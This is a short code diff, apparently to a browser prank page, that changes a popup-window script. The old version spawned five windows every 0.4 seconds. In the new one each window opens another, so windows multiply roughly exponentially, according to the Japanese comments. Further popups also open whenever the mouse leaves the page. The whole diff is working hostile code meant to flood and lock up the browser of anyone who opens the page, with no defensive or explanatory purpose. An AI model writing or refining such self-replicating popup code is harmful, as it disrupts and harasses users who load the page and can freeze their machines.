@@ -180,6 +180,7 @@ style.textContent = `
 document.head.appendChild(style);
 
 var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = 1;
+const splitIntervalMs = 1200;
 
 function openWindow() {
     popupCount++;
@@ -190,7 +191,8 @@ function openWindow() {
 }
 
 function proCreate() {	
-    for (var i = 0; i < 5; i++) openWindow();
+    // 1ウィンドウが1ウィンドウを増やすことで、全体がほぼ2^nで増える
+    openWindow();
 }
 
 function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
@@ -214,8 +216,8 @@ function playBall() {
 window.onload = function () {
     flagRun = 1;
     playBall();
-    proCreate();                    // すぐにポップアップを開く
-    setInterval(proCreate, 400);    // 0.4秒ごとに5個ずつ自動生成
+    // 親となる最初の1つだけ生成。以降はlol.html側で自己分裂する
+    proCreate();
 };
 
 window.onmouseout = proCreate;
